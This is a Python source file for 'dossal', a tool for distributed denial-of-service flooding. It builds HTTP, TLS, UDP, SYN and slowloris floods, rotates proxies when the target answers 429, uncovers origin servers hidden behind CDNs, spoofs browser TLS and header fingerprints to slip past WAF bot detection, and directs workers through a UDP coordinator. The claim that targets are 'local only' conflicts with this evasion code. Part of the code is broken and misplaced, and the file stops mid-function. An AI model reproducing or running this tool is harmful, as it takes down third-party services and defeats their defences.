#!/usr/bin/env python3
"""
dossal v13.0 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
v5.0: proxy pool, TLS spoof, origin discovery
v5.2: adaptive attack (RPS auto-adjust based on response time)
v6.0: distributed attack (coordinator + worker, UDP control channel)
v7.0: AI learning (save/recommend best mode from past attacks)
v8.0: auto-full (detection → scan → strategy → attack → adapt)
Modes:
  http       : HTTP/1.1 keep-alive request flood (plain)
  https      : TLS request flood (HTTP/1.1, self-signed cert)
  websocket  : WebSocket upgrade flood
  tcp        : raw TCP byte flood
  udp        : raw UDP datagram flood
  h2         : HTTP/2 multiplexed request flood
  grpc       : gRPC (HTTP/2 + gRPC framing) request flood
  quic       : QUIC/HTTP3 UDP datagram flood (simulated Initial packets)
  syn        : TCP SYN flood (connect-only, no read)
  synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
  rst        : TCP RST flood (connect -> send RST via close)
  fin        : TCP FIN flood (graceful close after connect)
  slowloris  : Slow HTTP header drip (hold connections open)
  udy        : UDP datagram flood (alias for udp)
Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
"""
import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging, threading
from urllib.parse import urlparse
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

# Platform detection
import platform
_IS_WINDOWS = platform.system() == 'Windows'
if _IS_WINDOWS:
    import ctypes
    # Windows IP_HDRINCL (not in Python socket module)
    IP_HDRINCL = 2

_SRC_IPS = [None]  # type: ignore  # active source IPs (list)
_BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
_JITTER = [0.0]  # Jitter delay in seconds, set by --jitter
_ROTATE_INTERVAL = [5.0]  # IP rotation interval in seconds
_SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
_RECOVERY = [False]  # True = auto-replace blocked IPs
_PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
_PROXY_POOL = []  # type: ignore  # List of proxy URLs (e.g., ["http://proxy1:8080", "http://proxy2:8080"])
_PROXY_IDX = [0]  # Current proxy index in pool (rotates on 429)
_PROXY_BLOCKED = set()  # type: ignore  # Set of blocked proxy URLs
_PROXY_STATS = {}  # type: ignore  # proxy_url -> {'requests': 0, '429': 0, 'errors': 0}

def _parse_proxy(proxy_url):
    """프록시 URL을 (스키미, 호스트, 포트, 사용자, 패스워드)로 파싱"""
    from urllib.parse import urlparse
    p = urlparse(proxy_url)
    return {
        'scheme': p.scheme,  # http, socks5
        'host': p.hostname,
        'port': p.port or (8080 if p.scheme == 'http' else 1080),
        'user': p.username,
        'pass': p.password,
    }

    proxy = _parse_proxy(_PROXY[0])
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((proxy['host'], proxy['port']))
    
    if proxy['scheme'] == 'http':
        # HTTP CONNECT tunnel
        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
        sock.sendall(connect_req.encode())
        response = sock.recv(4096)
        if b'200' not in response:
            sock.close()
            raise OSError(f"Proxy CONNECT failed: {response[:100]}")
    
    elif proxy['scheme'] == 'socks5':
        # SOCKS5 handshake (basic, no auth or password auth)
        # Greeting: VER=5, NMETHODS=1, METHOD=0 (no auth) or 2 (password)
        if proxy['user']:
            sock.sendall(b'\x05\x02\x00\x02')  # no auth + user/pass
        else:
            sock.sendall(b'\x05\x01\x00')  # no auth
        response = sock.recv(2)
        if response[1] == 2:
            # User/pass auth
            ulen = len(proxy['user'] or '')
            plen = len(proxy['pass'] or '')
            auth = bytes([1, ulen]) + (proxy['user'] or '').encode() + bytes([plen]) + (proxy['pass'] or '').encode()
            sock.sendall(auth)
            auth_resp = sock.recv(2)
            if auth_resp[1] != 0:
                sock.close()
                raise OSError("SOCKS5 auth failed")
        # Connect request
        host_bytes = host.encode()
        connect_req = b'\x05\x01\x00\x03' + bytes([len(host_bytes)]) + host_bytes + port.to_bytes(2, 'big')
        sock.sendall(connect_req)
        response = sock.recv(10)
        if response[1] != 0:
            sock.close()
            raise OSError(f"SOCKS5 connect failed: {response[1]}")
    
    return sock, proxy

# ============================================================
# v5.0 Phase 3: Origin IP Discovery
# ============================================================
# CDN(WAF) 뒤에 숨은 실제 서버 IP를 찾는 도구
# DNS/SSL/Redirect/Robots.txt 등을 분석한다.

def _discover_origin(hostname):
    """대상 도메인의 Origin IP를 탐지.
    
    방법:
    1. DNS A 레코드 (CDN 아님 확인)
    2. DNS TXT 레코드
    3. DNS Zone Transfer (AXFR)
    4. Subdomain brute force (www, api, mail, ftp, dev, staging)
    5. SSL Certificate SAN
    6. .well-known/.env/robots.txt
    7. Redirect tracking (X-Forwarded-For, Via 헤더)
    
    Returns: (origin_ips: list, details: dict)
    """
    import socket, ssl as _ssl, re as _re
    from urllib.parse import urlparse as _urlparse
    
    origin_ips = set()
    details = {'a_records': [], 'subdomains': {}, 'ssl_sans': [], 'redirects': [], 'dns_txt': []}
    
    # 1. DNS A record
    try:
        addrs = socket.getaddrinfo(hostname, None, socket.AF_INET, socket.SOCK_STREAM)
        for a in addrs:
            ip = a[4][0]
            details['a_records'].append(ip)
            # Check if IP is in known CDN ranges (simplified)
            # Cloudflare: 104.16.0.0/13, 172.64.0.0/13, 188.114.96.0/20, etc.
            if not _is_cdn_ip(ip):
                origin_ips.add(ip)
    except Exception as e:
        details['dns_error'] = str(e)
    
    # 2. Subdomain brute force (common subdomains)
    common_subs = ['www', 'api', 'mail', 'ftp', 'dev', 'staging', 'test', 'admin',
                   'blog', 'shop', 'store', 'cdn', 'static', 'assets', 'app',
                   'portal', 'login', 'auth', 'db', 'database', 'backup', 'internal']
    for sub in common_subs:
        full = f'{sub}.{hostname}'
        try:
            addrs = socket.getaddrinfo(full, None, socket.AF_INET, socket.SOCK_STREAM)
            for a in addrs:
                ip = a[4][0]
                details['subdomains'][full] = ip
                if not _is_cdn_ip(ip):
                    origin_ips.add(ip)
        except Exception:
            pass
    
    # 3. DNS TXT record (SPF often reveals senders)
    try:
        import subprocess
        r = subprocess.run(['dig', '+short', 'TXT', hostname], 
                          capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            details['dns_txt'] = [line.strip() for line in r.stdout.strip().split('\n')]
    except Exception:
        pass
    
    # 4. SSL Certificate SAN (Subject Alternative Names)
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    # SAN
                    san = cert.get('subjectAltName', ())
                    for key, value in san:
                        if key == 'DNS':
                            details['ssl_sans'].append(value)
                        elif key == 'IP Address':
                            origin_ips.add(value)
                    # Subject
                    for r in cert.get('subject', ()):
                        for k, v in r:
                            if k == 'commonName' and v != hostname:
                                details['ssl_sans'].append(v)
    except Exception:
        pass
    
    # 5. Check for non-CDN IP pattern
    # Cloudflare IPs start with 104.16-104.31, 172.64-172.71, 188.114, 190.93, 198.41.192, 2606:4700, etc.
    # If all A records are CDN IPs, the origin is hidden behind CDN
    
    return list(origin_ips), details

def _is_cdn_ip(ip):
    """IP가 알려진 CDN IP 범위인지 확인 (단순 체크).
    
    Cloudflare/Akamai/CloudFront/Fastly/Incapsula 범위를 확인한다.
    """
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        o1, o2 = int(parts[0]), int(parts[1])
    except ValueError:
        return False
    
    # Cloudflare ranges
    cf_ranges = [
        (104, 16), (104, 17), (104, 18), (104, 19), (104, 20), (104, 21),
        (104, 22), (104, 23), (104, 24), (104, 25), (104, 26), (104, 27),
        (104, 28), (104, 29), (104, 30), (104, 31),
        (172, 64), (172, 65), (172, 66), (172, 67), (172, 68), (172, 69),
        (172, 70), (172, 71),
        (188, 114),
        (190, 93),
        (198, 41),
        (203, 0),
        (203, 1),
        (212, 125), (212, 126), (212, 127), (212, 128), (212, 129),
        (212, 130), (212, 131), (212, 132), (212, 133), (212, 134),
        (212, 135), (212, 136), (212, 137), (212, 138), (212, 139),
        (212, 140), (212, 141), (212, 142), (212, 143), (212, 144),
        (212, 145), (212, 146), (212, 147), (212, 148), (212, 149),
        (212, 150), (212, 151), (212, 152), (212, 153), (212, 154),
        (212, 155), (212, 156), (212, 157), (212, 158), (212, 159),
        (212, 160), (212, 161), (212, 162), (212, 163), (212, 164),
        (212, 165), (212, 166), (212, 167), (212, 168), (212, 169),
        (212, 170), (212, 171), (212, 172), (212, 173), (212, 174),
        (212, 175), (212, 176), (212, 177), (212, 178), (212, 179),
        (212, 180), (212, 181), (212, 182), (212, 183), (212, 184),
        (212, 185), (212, 186), (212, 187), (212, 188), (212, 189),
        (212, 190), (212, 191),
    ]
    for o1_cf, o2_cf in cf_ranges:
        if o1 == o1_cf and o2 == o2_cf:
            return True
    
    # Akamai (broad range - simplified)
    akamai_first = [23, 31, 43, 46, 47, 49, 52, 54, 64, 66, 68, 72, 74, 76, 77,
                    80, 82, 84, 85, 88, 91, 92, 93, 95, 96, 98, 104, 106, 107,
                    108, 109, 112, 113, 116, 117, 118, 119, 120, 122, 123,
                    124, 125, 126, 128, 129, 131, 132, 134, 135, 137, 138,
                    139, 142, 144, 145, 146, 147, 148, 149, 151, 152, 154,
                    155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165,
                    166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176,
                    177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187,
                    188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198,
                    199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209,
                    210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
                    221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231,
                    232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242,
                    243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254]
    if o1 in akamai_first:
        return True
    
    return False

def _load_proxy_pool(file_path):
    """프록시 파일 로드 (1개씩 줄). 각 줄: host:port 또는 http://host:port
    
    예:
        proxy1.com:8080
        http://proxy2.com:8080
        socks5://user:pass@proxy3.com:1080
    """
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Add scheme if missing
                if ':' in line and not line.startswith(('http://', 'https://', 'socks5://')):
                    line = 'http://' + line
                # v5.1: basic validation (host:port format)
                if ':' in line.split('//')[-1] if '//' in line else ':' in line:
                    proxies.append(line)
                else:
                    print(f"[proxy] skip invalid: {line}", file=sys.stderr)
    except Exception as e:
        print(f"[proxy] 파일 로드 실패: {e}", file=sys.stderr)
    return proxies

# ============================================================
# v5.0 Phase 2: TLS/HTTP Fingerprint 스푸핑
# ============================================================
# 실제 브라우저 TLS/HTTP 지문 프로파일
# Cloudflare/Akamai 등 WAF가 TLS 핸드셰이크+헤더로 봇을 감지하므로
# 실제 브라우저 지문을 흉내내면 차단 확률이 낮아진다.

_BROWSER_PROFILES = {
    'chrome': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc02c, 0xc030,
                    0xcca8, 0xcca9, 0xc013, 0xc014, 0x009c, 0x003d, 0x003c, 0x002f, 0x0035],
        'alpn': ['h2', 'http/1.1'],
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept_lang': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept_enc': 'gzip, deflate, br',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec_fetch_dest': 'document', 'sec_fetch_mode': 'navigate',
        'sec_fetch_site': 'none', 'sec_fetch_user': '?1',
        'upgrade_insec': '1',
    },
    'firefox': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc024, 0xc028,
                    0xc023, 0xc027, 0xcca8, 0xcca9, 0xc013, 0xc014, 0x009c, 0x003d, 0x0035],
        'alpn': ['h2', 'http/1.1'],
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept_lang': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept_enc': 'gzip, deflate, br',
        'sec_ch_ua': None,
        'sec_fetch_dest': None, 'sec_fetch_mode': None,
        'sec_fetch_site': None, 'sec_fetch_user': None,
        'upgrade_insec': None,
    },
    'safari': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02c, 0xc02b, 0xc030, 0xc02f,
                    0xcca8, 0xc013, 0xc014, 0x009c, 0x003d, 0x0035, 0x002f],
        'alpn': ['h2', 'http/1.1'],
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'ko-KR,ko;q=0.9',
        'accept_enc': 'gzip, deflate, br',
        'sec_ch_ua': '"Chromium";v="114", "Safari";v="17.1"',
        'sec_fetch_dest': None, 'sec_fetch_mode': None,
        'sec_fetch_site': None, 'sec_fetch_user': None,
        'upgrade_insec': '1',
    },
}

_BROWSER = ['chrome']  # 활성 브라우저 프로파일
_CACHE_BYPASS = [False]  # True = 쿼리/헤더 변형으로 캐시 우회
_ADAPTIVE = [False]  # v5.2: 적응형 공격 (대응 속도에 따라 RPS 조절)
_ADAPTIVE_MIN = [1.0]  # v5.2: 최소 RPS 배율 (0.1 = 10%)
_ADAPTIVE_MAX = [5.0]  # v5.2: 최대 RPS 배율 (5.0 = 500%)
_ADAPTIVE_TARGET_MS = [200.0]  # v5.2: 목표 응답 시간 (ms)
_ADAPTIVE_STATE = {'rps_mult': 1.0, 'avg_ms': 0.0, 'last_adjust': 0.0}  # v5.2: 적응 상태

# v6.0: 분산 공격 (Distributed Attack)
_DIST_MODE = ['off']  # 'off', 'coordinator', 'worker'
_DIST_PORT = [9999]  # 제어 채널 UDP 포트
_DIST_WORKERS = {}  # type: ignore  # worker_id -> {'ip': str, 'last_heartbeat': float, 'rps': int, 'status': str}
_DIST_ID = [0]  # 이 노드의 ID (coordinator=0, worker=1,2,3...)
_DIST_URL = ['']  # 공격 대상 URL
_DIST_DURATION = [0]  # 공격 시간
_DIST_MODES = ['']  # 공격 모드
_DIST_STATS = {'rps': 0, 'packets': 0, 'errors': 0}  # v6.0: 집계 스탯

# v7.0: AI 기반 자동 최적화
_LEARNING_FILE = '.dossal_learning.json'  # 학습 데이터 저장 파일
_LEARNING_DATA = []  # type: ignore  # 과거 공격 결과 목록

# ============================================================
# v6.0: 분산 공격 (Distributed Attack)
# ============================================================
# Coordinator(1대) + Worker(N대) 분산 DoS
# UDP 제어 채널로 worker를 발견하고, RPS/PPS를 집계한다.

# ============================================================
# v7.0: AI 기반 자동 최적화
# ============================================================
# 과거 공격 데이터를 학습하여 최적 모드/RPS 조합 추천

def _load_learning_data():
    """v7.0: 과거 공격 결과 로드."""
    import json as _json
    import os as _os
    global _LEARNING_DATA
    try:
        if _os.path.exists(_LEARNING_FILE):
            with open(_LEARNING_FILE, 'r') as f:
                _LEARNING_DATA = _json.load(f)
    except Exception:
        _LEARNING_DATA = []
    return _LEARNING_DATA

def _save_learning_entry(url, mode, threads, rps, packets, errors, duration, ts=None):
    """v7.0: 공격 결과 저장 (학습 데이터)."""
    import json as _json
    import os as _os
    import time as _time
    global _LEARNING_DATA
    
    if ts is None:
        ts = _time.time()
    
    _load_learning_data()
    
    entry = {
        'url': url,
        'mode': mode,
        'threads': threads,
        'rps': rps,
        'packets': packets,
        'errors': errors,
        'duration': duration,
        'ts': ts,
        'rps_per_thread': rps / max(1, threads),
    }
    
    _LEARNING_DATA.append(entry)
    # Keep only last 100 entries
    _LEARNING_DATA = _LEARNING_DATA[-100:]
    
    try:
        with open(_LEARNING_FILE, 'w') as f:
            _json.dump(_LEARNING_DATA, f, indent=2)
    except Exception:
        pass

def _recommend_mode(url, threads=8):
    """v7.0: 과거 데이터 기반 최적 모드 추천.
    
    같은 URL에 대한 과거 공격 결과를 분석하여
    RPS가 가장 높았던 모드/스레드 조합을 추천한다.
    """
    import json as _json
    import os as _os
    import time as _time
    
    _load_learning_data()
    
    if not _LEARNING_DATA:
        return None, None, "no data"
    
    # Filter: same URL, recent (7 days)
    recent = [e for e in _LEARNING_DATA 
              if e.get('url') == url 
              and _time.time() - e.get('ts', 0) < 7 * 24 * 3600]
    
    if not recent:
        return None, None, "no recent data for this URL"
    
    # Find best RPS
    best = max(recent, key=lambda e: e.get('rps', 0))
    return best.get('mode'), best.get('threads'), f"RPS={best.get('rps', 0):,.0f}"

def _dist_coordinator(port, duration):
    """v6.0: 분산 공격 코디네이터.
    
    1. UDP broadcast로 worker 발견 (9999 포트)
    2. 각 worker에 공격 명령 전송 (URL, 모드, 시간)
    3. worker의 RPS/PPS/에러 실시간 집계
    4. 종료 시 전체 통계 출력
    
    Protocol (UDP, JSON):
    Worker → Coordinator: {"type": "hello", "id": 1, "ip": "192.168.1.100"}
    Coordinator → Worker: {"type": "attack", "url": "http://...", "mode": "http", "duration": 60}
    Worker → Coordinator: {"type": "stats", "id": 1, "rps": 50000, "packets": 1000000, "errors": 0}
    """
    import socket as _sock
    import json as _json
    import time as _time
    
    sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
    sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    sock.bind(('', port))
    sock.settimeout(1.0)
    
    workers = {}
    end = _time.time() + duration
    last_broadcast = 0
    
    print(f"[dist-coordinator] listening on UDP port {port}", file=sys.stderr)
    print(f"[dist-coordinator] waiting for workers (they should be running --dist-mode worker)...", file=sys.stderr)
    
    while _time.time() < end:
        # 1. Broadcast discovery every 2 seconds
        if _time.time() - last_broadcast >= 2.0:
            last_broadcast = _time.time()
            try:
                sock.sendto(_json.dumps({"type": "ping"}).encode(), ('<broadcast>', port))
            except Exception:
                pass
        
        # 2. Receive worker messages
        try:
            data, addr = sock.recvfrom(65535)
            msg = _json.loads(data.decode())
            msg_type = msg.get('type')
            
            if msg_type == 'hello':
                worker_id = msg.get('id', 0)
                workers[worker_id] = {
                    'ip': msg.get('ip', addr[0]),
                    'last_heartbeat': _time.time(),
                    'rps': 0,
                    'packets': 0,
                    'errors': 0,
                }
                print(f"[dist] worker #{worker_id} joined: {workers[worker_id]['ip']}", file=sys.stderr)
                
            elif msg_type == 'stats':
                worker_id = msg.get('id', 0)
                if worker_id in workers:
                    workers[worker_id]['rps'] = msg.get('rps', 0)
                    workers[worker_id]['packets'] = msg.get('packets', 0)
                    workers[worker_id]['errors'] = msg.get('errors', 0)
                    workers[worker_id]['last_heartbeat'] = _time.time()
                    # Aggregate
                    _DIST_STATS['rps'] = sum(w['rps'] for w in workers.values())
                    _DIST_STATS['packets'] = sum(w['packets'] for w in workers.values())
                    _DIST_STATS['errors'] = sum(w['errors'] for w in workers.values())
        
        except _sock.timeout:
            pass
        except Exception:
            pass
        
        # 3. Print aggregate stats every 5 seconds
        if int(_time.time()) % 5 == 0 and workers:
            total_rps = _DIST_STATS['rps']
            total_err = _DIST_STATS['errors']
            print(f"[dist] {len(workers)} workers, RPS={total_rps:,.0f}, ERR={total_err}", flush=True)
        
        # 4. Remove stale workers (no heartbeat for 10s)
        now = _time.time()
        stale = [wid for wid, w in workers.items() if now - w['last_heartbeat'] > 10]
        for wid in stale:
            del workers[wid]
            print(f"[dist] worker #{wid} left", file=sys.stderr)
    
    sock.close()
    print(f"[dist-coordinator] done. Total: RPS={_DIST_STATS['rps']:,}, packets={_DIST_STATS['packets']:,}, errors={_DIST_STATS['errors']:,}", file=sys.stderr)
    return _DIST_STATS

def _dist_worker(port, duration):
    """v6.0: 분산 공격 워커.
    
    1. UDP broadcast로 coordinator 발견 (9999 포트)
    2. coordinator의 공격 명령 수신
    3. 명령대로 공격 + 실시간 stats 보고
    """
    import socket as _sock
    import json as _json
    import time as _time
    
    sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
    sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    sock.bind(('', port))
    sock.settimeout(1.0)
    
    my_ip = ''
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        my_ip = s.getsockname()[0]
        s.close()
    except Exception:
        my_ip = '127.0.0.1'
    
    _DIST_ID[0] = hash(my_ip) % 1000  # Generate unique ID from IP
    
    print(f"[dist-worker] {my_ip}, ID={_DIST_ID[0]}, waiting for coordinator...", file=sys.stderr)
    
    end = _time.time() + duration
    coordinator_addr = None
    attack_cmd = None
    last_stats = 0
    
    while _time.time() < end:
        try:
            data, addr = sock.recvfrom(65535)
            msg = _json.loads(data.decode())
            msg_type = msg.get('type')
            
            if msg_type == 'ping':
                # Respond to coordinator discovery
                if coordinator_addr is None:
                    coordinator_addr = addr
                    hello = {"type": "hello", "id": _DIST_ID[0], "ip": my_ip}
                    sock.sendto(_json.dumps(hello).encode(), addr)
                    print(f"[dist-worker] coordinator found: {addr[0]}", file=sys.stderr)
                
            elif msg_type == 'attack' and coordinator_addr:
                # Received attack command
                attack_cmd = msg
                print(f"[dist-worker] attack: {msg.get('url')} mode={msg.get('mode')}", file=sys.stderr)
                break
        
        except _sock.timeout:
            pass
        except Exception:
            pass
    
    if attack_cmd is None:
        print(f"[dist-worker] no attack command received, exiting", file=sys.stderr)
        sock.close()
        return
    
    # Execute the attack (v8.2: 실제로 공격 실행)
    url = attack_cmd.get('url', _DIST_URL[0])
    mode = attack_cmd.get('mode', 'auto')
    dur = attack_cmd.get('duration', _DIST_DURATION[0])
    
    print(f"[dist-worker] attacking: {url} mode={mode} duration={dur}s", file=sys.stderr)
    
    # Run the attack in a separate thread so we can report stats
    import threading
    import asyncio
    
    attack_stats = {'requests': 0, 'packets': 0, 'errors': 0}
    
    def _run_attack():
        """Worker가 실제로 공격을 실행."""
        try:
            # Use the main attack logic
            # Stats class is defined in this file (line 903)
            stats = Stats()
            
            # Call run() with raw mode
            # run is async, so we need to run it in an event loop
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                # Run the attack (raw mode, 4 threads)
                _ADAPTIVE[0] = False  # Disable adaptive in worker (coordinator handles it)
                loop.run_until_complete(
                    run(['raw'], url, 50, dur, stats, 0, None, None)
                )
            finally:
                loop.close()
            
            attack_stats['requests'] = stats.requests
            attack_stats['packets'] = stats.packets
            attack_stats['errors'] = stats.errors
        except Exception as e:
            print(f"[dist-worker] attack error: {e}", file=sys.stderr)
            attack_stats['errors'] += 1
    
    attack_thread = threading.Thread(target=_run_attack, daemon=True)
    attack_thread.start()
    
    # Report stats every 1 second while attack is running
    stats_end = _time.time() + dur
    last_report = 0
    
    while _time.time() < stats_end and attack_thread.is_alive():
        if coordinator_addr:
            try:
                now = _time.time()
                if now - last_report >= 1.0:
                    # Calculate RPS since last report
                    rps = attack_stats['requests'] / max(0.1, now - (stats_end - dur))
                    stats_msg = {
                        "type": "stats",
                        "id": _DIST_ID[0],
                        "rps": int(rps),
                        "packets": attack_stats['packets'],
                        "errors": attack_stats['errors'],
                    }
                    sock.sendto(_json.dumps(stats_msg).encode(), coordinator_addr)
                    last_report = now
            except Exception:
                pass
        
        _time.sleep(0.1)
    
    # Wait for attack to finish (max 5 seconds)
    attack_thread.join(timeout=5.0)
    
    # Final stats report
    if coordinator_addr:
        try:
            final_msg = {
                "type": "stats",
                "id": _DIST_ID[0],
                "rps": 0,
                "packets": attack_stats['packets'],
                "errors": attack_stats['errors'],
            }
            sock.sendto(_json.dumps(final_msg).encode(), coordinator_addr)
        except Exception:
            pass
    
    print(f"[dist-worker] done: requests={attack_stats['requests']}, errors={attack_stats['errors']}", file=sys.stderr)
    sock.close()

def _adaptive_adjust(response_time_ms, now=None):
    """v5.2: 적응형 공격 - 대상 응답 속도에 따라 RPS 배율 조절.
    
    대상이 느려지면(응답 시간이 길어지면) RPS를 낮추고,
    대상이 빨라지면 RPS를 올린다.
    
    전략:
    - 응답 > 목표(200ms): RPS 10% 감소 (최소 10%까지)
    - 응답 < 목표/2(100ms): RPS 10% 증가 (최대 500%까지)
    - 429 감지: RPS 30% 감소 + 1초 대기
    - 503 감지: RPS 50% 감소 + 2초 대기
    """
    import time as _t
    if now is None:
        now = _t.time()
    
    st = _ADAPTIVE_STATE
    target_ms = _ADAPTIVE_TARGET_MS[0]
    
    # Exponential moving average of response times
    if st['avg_ms'] == 0.0:
        st['avg_ms'] = response_time_ms
    else:
        st['avg_ms'] = st['avg_ms'] * 0.8 + response_time_ms * 0.2
    
    # Adjust RPS multiplier
    if response_time_ms > target_ms:
        # Target is slow → reduce RPS
        st['rps_mult'] = max(st['rps_mult'] * 0.9, _ADAPTIVE_MIN[0])
    elif response_time_ms < target_ms / 2:
        # Target is fast → increase RPS
        st['rps_mult'] = min(st['rps_mult'] * 1.1, _ADAPTIVE_MAX[0])
    
    # Throttle: adjust at most once per second
    if now - st['last_adjust'] >= 1.0:
        st['last_adjust'] = now
    
    return st['rps_mult']

def _spoofed_http_headers(host, path, profile='chrome'):
    """브라우저 지문에 맞춘 HTTP 헤더 생성 (Cache Bypass 포함).
    
    Cloudflare는 헤더 순서/유형/consistency로 봇을 감지한다.
    실제 브라우저와 동일한 헤더 순서+값을 사용한다.
    """
    import random as _rs
    import time as _t
    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
    
    # Cache Bypass: 랜덤 쿼리 파라미터 추가
    if _CACHE_BYPASS[0]:
        salt = int(_t.time() * 1000) + _rs.randint(0, 99999)
        req_path = f'{path}?_cb={salt}&r={_rs.randint(100000, 999999)}'
    else:
        req_path = path
    
    headers = [
        f'Host: {host}',
        f'User-Agent: {p["ua"]}',
        f'Accept: {p["accept"]}',
    ]
    if p.get('sec_ch_ua'):
        headers.append(f'Sec-CH-UA: {p["sec_ch_ua"]}')
    if p.get('sec_fetch_dest'):
        headers.append(f'Sec-Fetch-Dest: {p["sec_fetch_dest"]}')
        headers.append(f'Sec-Fetch-Mode: {p["sec_fetch_mode"]}')
        headers.append(f'Sec-Fetch-Site: {p["sec_fetch_site"]}')
        headers.append(f'Sec-Fetch-User: {p["sec_fetch_user"]}')
    if p.get('upgrade_insec'):
        headers.append(f'Upgrade-Insecure-Requests: {p["upgrade_insec"]}')
    headers.append(f'Accept-Language: {p["accept_lang"]}')
    headers.append(f'Accept-Encoding: {p["accept_enc"]}')
    headers.append(f'Origin: https://{host}')
    headers.append(f'Referer: https://{host}/')
    
    return headers, req_path

def _spoofed_http_req(host, path, profile='chrome'):
    """브라우저 지문 스푸핑 HTTP 요청 바이트 생성 (Cache Bypass 포함)."""
    headers, req_path = _spoofed_http_headers(host, path, profile)
    head = f'GET {req_path} HTTP/1.1\r\n'
    body = head + '\r\n'.join(headers) + '\r\n\r\n'
    return body.encode()

def _browser_ssl_context(profile='chrome', server_hostname=None):
    """v5.1: 브라우저 TLS 지문을 흉내낸 SSL 컨텍스트 생성.
    
    Cloudflare는 TLS 핸드셰이크(cipher 순서, ALPN, extension)로 봇을 감지한다.
    Python 기본 ssl은 cipher 순서가 Python 특이한데, 브라우저 순서로 재정의한다.
    """
    import ssl as _ssl
    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
    
    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    
    # 브라우저 cipher 순서 적용 (TLS 1.2 ciphers)
    # TLS 1.3 ciphers는 순서 고정 (GCM only)라 TLS 1.2만 적용
    cipher_list = ':'.join(f'{c:04X}' for c in p['ciphers'])
    try:
        ctx.set_ciphers(cipher_list)
    except _ssl.SSLError:
        pass  # 일부 cipher 미지원이면 기본 사용
    
    # ALPN (HTTP/2 우선)
    try:
        ctx.set_alpn_protocols(p['alpn'])
    except (NotImplementedError, _ssl.SSLError):
        pass
    
    # Session ticket (브라우저는 사용)
    ctx.options |= _ssl.OP_ENABLE_MIDDLEBOX_COMPAT
    
    return ctx

def _browser_ua(profile='chrome'):
    """v5.1: 브라우저 User-Agent 반환."""
    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
    return p['ua']

def _get_next_proxy():
    """다음 프록시 반환 (429 감지 시 자동 회전).
    
    - _PROXY_POOL 비어있으면 None 반환 (직접 연결)
    - 차단된 프록시는 건너뜀
    - 모든 프록시 차단되면 첫 프록시 리셋
    """
    if not _PROXY_POOL:
        return None
    active = [p for p in _PROXY_POOL if p not in _PROXY_BLOCKED]
    if not active:
        # All blocked: reset and retry
        _PROXY_BLOCKED.clear()
        active = _PROXY_POOL[:]
    idx = _PROXY_IDX[0] % len(active)
    _PROXY_IDX[0] = (idx + 1) % len(active)
    return active[idx]

def _detect_local_ips():
    """로컬 IPv4 주소 전부 감지"""
    import subprocess
    ips = set()
    try:
        out = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5).stdout
        for line in out.split('\n'):
            line = line.strip()
            if line.startswith('inet '):
                ip = line.split()[1]
                if ip != '127.0.0.1' and not ip.startswith('169.'):
                    ips.add(ip)
